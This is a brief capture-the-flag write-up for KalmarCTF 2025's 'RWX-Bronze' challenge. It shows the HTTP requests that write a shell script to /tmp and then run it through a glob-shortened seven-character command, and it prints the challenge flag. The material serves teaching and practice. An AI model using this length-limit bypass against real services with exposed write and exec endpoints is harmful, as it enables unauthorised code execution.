---
title: RWX-Bronze
date: 2025-03-10T02:48:43+03:00
description: Writeup for RWX-Bronze [KalmarCTF 2025]
type: writeup
author: h3pha
tags:
- misc
draft: false
---
___

## Challenge Description

We give you file read, file write and code execution. But can you get the flag? Let's start out gently.

NOTE: If you get a 404 error, try using one of the endpoints described in the handout!

## Intuition

The challenge lets us execute commands of length 7, so we cannot execute `/would` with the necessary argument. My first attempt was to create a script file and run it with a command.

## Solution

Wrote the script into the `/tmp` directory:
```
POST /write?filename=/tmp/a HTTP/2

#!/bin/sh
/would you be so kind to provide me with a flag
```

Executed the script: `sh /*/a`
```
GET /exec?cmd=sh%20/*/a HTTP/2 
```

### Flag

`kalmar{ok_you_demonstrated_your_rwx_abilities_but_let_us_put_you_to_the_test_for_real_now}`